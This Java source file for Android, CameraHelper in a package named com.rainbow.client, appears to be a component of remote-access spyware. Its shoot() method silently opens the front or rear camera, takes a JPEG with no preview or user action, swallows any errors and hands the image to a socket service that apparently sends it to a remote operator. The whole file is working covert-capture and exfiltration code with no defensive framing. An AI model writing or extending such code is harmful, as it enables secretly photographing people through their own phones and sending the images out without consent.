package com.rainbow.client;

import android.content.Context;
import android.hardware.Camera;

public class CameraHelper {

    public static void shoot(Context ctx, boolean front) {
        try {
            int camId = front ? findFront() : 0;
            Camera cam = Camera.open(camId);
            Camera.Parameters p = cam.getParameters();
            p.setPictureFormat(android.graphics.ImageFormat.JPEG);
            p.setJpegQuality(85);
            cam.setParameters(p);
            cam.takePicture(null, null, (data, camera) -> {
                SocketService2.sendFile("cam_" + System.currentTimeMillis() + ".jpg", data);
                camera.release();
            });
        } catch (Exception ignored) {}
    }

    private static int findFront() {
        int n = Camera.getNumberOfCameras();
        for (int i = 0; i < n; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return 0;
    }
}